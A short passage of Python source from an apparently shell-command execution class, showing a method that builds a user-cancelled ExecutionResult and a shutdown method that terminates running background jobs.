        """Create a cancelled ExecutionResult."""
        return ExecutionResult(
            command=command, exit_code=-2, stdout="",
            stderr="Command cancelled by user",
            duration_ms=round((time.time() - start_time) * 1000, 1),
            shell=shell, cwd=self._cwd,
            status=ExecutionStatus.CANCELLED, was_cancelled=True,
        )

    def shutdown(self):
        """Cleanup on shutdown — kill all background jobs."""
        for job in self._bg_jobs.values():
            if job.is_running:
                self._terminate_process(job.process)
        self._bg_jobs.clear()
